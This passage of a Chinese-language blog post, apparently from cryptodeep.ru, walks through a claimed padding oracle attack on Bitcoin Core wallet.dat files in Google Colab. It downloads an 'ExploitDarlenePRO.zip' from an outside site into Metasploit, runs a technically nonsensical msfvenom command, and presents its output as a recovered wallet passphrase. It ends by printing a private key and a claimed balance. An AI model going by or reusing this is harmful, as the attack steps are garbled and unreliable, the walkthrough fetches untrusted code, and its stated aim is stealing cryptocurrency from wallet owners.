<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們安裝一個函式庫<code>'config-hash'</code>來簡化大數據的處理。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install config-hash -v 0.9.0</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4173} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-87.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4173"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">讓我們安裝 Metasploit Framework 並使用 MSFVenom</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":4055} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-69-1024x506.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4055"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們從<a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener">GitHub安裝</a><a href="https://www.metasploit.com/" target="_blank" rel="noreferrer noopener">Metasploit 框架</a>並使用<a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener">MSFVenom</a>工具建立有效負載。<a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3759} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-22-1024x476.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3759"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!git clone https://github.com/rapid7/metasploit-framework.git
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd metasploit-framework/</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4175} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-88-1024x627.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4175"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>我們來看看資料夾的內容<code>"<strong><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noreferrer noopener">metasploit-framework</a></strong>"</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3761} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-24.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3761"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">選項：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!./msfvenom -help </code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4176} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-89-1024x441.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4176"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">讓我們在 Google Colab 中安裝<a href="https://github.com/bitcoin/bitcoin.git" target="_blank" rel="noreferrer noopener">Bitcoin Core 整合/暫存樹</a>：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!git clone https://github.com/bitcoin/bitcoin.git

</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4180} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-90-1024x511.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4180"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">讓我們透過目錄找到檔案：<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.cpp" target="_blank" rel="noreferrer noopener">aes.cpp</a>來整合漏洞以<a href="https://cryptodeeptech.ru/padding-oracle-attack-on-wallet-dat/" target="_blank" rel="noreferrer noopener">對Wallet.dat發起Padding Oracle Attack</a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd bitcoin/src/crypto/</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4181} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-91-1024x354.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4181"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">使用 cat 實用程式開啟檔案：<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.cpp" target="_blank" rel="noreferrer noopener">aes.cpp</a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat aes.cpp</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4182} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-92-1024x445.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4182"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">若要進行攻擊，請將檔案：<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat</a>上傳至目錄：<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener">bitcoin/src/crypto/</a></h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們使用該實用程式<strong><code>wget</code></strong>並從<strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">27PaddingOracleAttackonWalletdat儲存庫下載</a></strong><a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener"><strong>wallet.dat</strong></a><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!wget https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4185} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-93-1024x317.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4185"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們檢查一下目錄的內容：<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener"><strong>bitcoin/src/crypto/</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4187} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-94-1024x288.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4187"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們回到<code><strong>Metasploit Framework</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4192} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-95-1024x565.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4192"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>我們按照目錄打開資料夾：<code>/modules/exploits/</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4063} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-70.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4063"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://darlene.pro/" target="_blank" rel="noreferrer noopener">利用DarlenePRO</a></strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>"ExploitDarlenePRO"</code>從目錄下載：<code>/modules/exploits/</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd modules/

ls

cd exploits/

!wget https://darlene.pro/repository/fe9b4545d58e43c1704b0135383e5f124f36e40cb54d29112d8ae7babadae791/ExploitDarlenePRO.zip</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4197} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-97-1024x455.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4197"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>ExploitDarlenePRO.zip</code>使用該實用程式解壓縮內容<code>unzip</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!unzip ExploitDarlenePRO.zip</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4199} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-98-1024x462.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4199"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們來瀏覽一下目錄：<code>/ExploitDarlenePRO/</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls

cd ExploitDarlenePRO/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-4.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要運行該漏洞，讓我們回到<code><strong>Metasploit Framework</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4205} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-101-1024x477.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4205"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>我們需要識別我們的<strong><code>LHOST&nbsp;(Local Host)</code></strong>攻擊&nbsp;<strong><code>IP-address</code></strong>虛擬機器。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>讓我們運行命令：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!ip addr
!hostname -I</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":3795} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-6.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3795"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們使用該工具來創建有效負載&nbsp;<strong><code>MSFVenom</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>操作時選擇比特幣錢包：<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-80.png" alt="Libbitcoin Explorer 3.x庫中的Milk Sad漏洞，如何從比特幣錢包（BTC）用戶竊取90萬美元"/><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>啟動命令：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!./msfvenom 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o decode_core.rb -p bitcoin/src/crypto LHOST=172.28.0.12 -f CPP -o aes.cpp -p bitcoin/src/crypto LHOST=172.28.0.12 -f DAT -o wallet.dat
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4211} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-104-1024x237.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4211"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>我們需要將生成的二進位格式儲存到檔案中：<strong><code><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/walletpassphrase.txt" target="_blank" rel="noreferrer noopener">walletpassphrase.txt</a></code></strong>我們將使用<strong><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/binary_save.py">Python 腳本</a></em></strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>團隊：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>import hashlib

Binary = "1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101"

f = open("walletpassphrase.txt", 'w')
f.write("walletpassphrase " + Binary + " 60" + "\n")
f.write("" + "\n")
f.close()

</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4214} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-105-1024x439.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4214"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">開啟檔案：<a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/walletpassphrase.txt" target="_blank" rel="noreferrer noopener">walletpassphrase.txt</a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat walletpassphrase.txt</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4216} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-106-1024x607.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4216"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">結果：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>walletpassphrase 1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101 60
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">存取私鑰的密碼已找到！</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><code>dumpprivkey "address"</code></strong>讓我們透過控制台使用該命令<strong><code>Bitcoin Core</code></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><strong>團隊：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>walletpassphrase 1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101 60
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif04.gif" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">私鑰已收到！</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們安裝庫<code><strong>Bitcoin Utils</strong></code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>pip3 install bitcoin-utils</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4221} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-107-1024x431.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4221"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們運行<a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/bitcoin_utils.py" target="_blank" rel="noreferrer noopener"><strong>程式碼</strong></a>來檢查比特幣地址的合規性：</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4223} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-109-1024x801.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4223"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Private key WIF: KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
Public key: 02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f
Address: 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
Hash160: 7774801e52a110aba2d65ecc58daf0cfec95a09f

--------------------------------------

The message to sign: CryptoDeepTech
The signature is: ILPeG1ThZ0XUXz3iPvd0Q6ObUTF7SxmnhUK2q0ImEeepcZ00npIRqMWOLEfWSJTKd1g56CsRFa/xI/fRUQVi19Q=
The signature is valid!</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>這是正確的！私鑰對應比特幣錢包。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">讓我們打開&nbsp;<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;並檢查：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
WIF:  KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
HEX:  3A32D38E814198CC8DD20B49752615A835D67041C4EC94489A61365D9B6AD330</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4225} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-110.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4225"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/en/explorer/addresses/btc/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/en/explorer/addresses/btc/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4226} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-111.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4226"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4227} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-112.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4227"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4228} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-113-1024x146.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4228"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><code>BALANCE: $ 44502.42</code></strong></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">參考：</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>[1]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Practical_Padding_Oracle_Attacks_Juliano_Rizzo_Thai_Duong.pdf" target="_blank" rel="noreferrer noopener">實用填充預言機攻擊<strong>(Juliano Rizzo Thai Duong) [2010]</strong></a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
